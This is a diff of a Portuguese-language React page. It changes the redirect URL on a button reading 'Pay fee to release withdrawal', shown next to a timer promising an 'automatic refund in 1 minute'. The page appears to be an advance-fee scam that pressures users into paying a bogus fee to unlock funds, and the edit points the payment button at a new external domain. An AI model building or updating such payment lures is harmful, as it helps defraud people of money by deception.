@@ -684,7 +684,7 @@ const Index = () => {
           </div>
           
           <div className="confirmation-section">
-            <button className="confirmation-cta-button" onClick={() => window.location.href = 'https://pay.areattkbrasil.online/69502c98ba5828cde4453293'}>
+            <button className="confirmation-cta-button" onClick={() => window.location.href = 'https://ambienteseguro.org.ua/c/d68e0e476b'}>
               Pagar taxa para Liberar Saque
             </button>
             <div className="confirmation-timer">⏱️ Reembolso automático em 1 minuto</div>
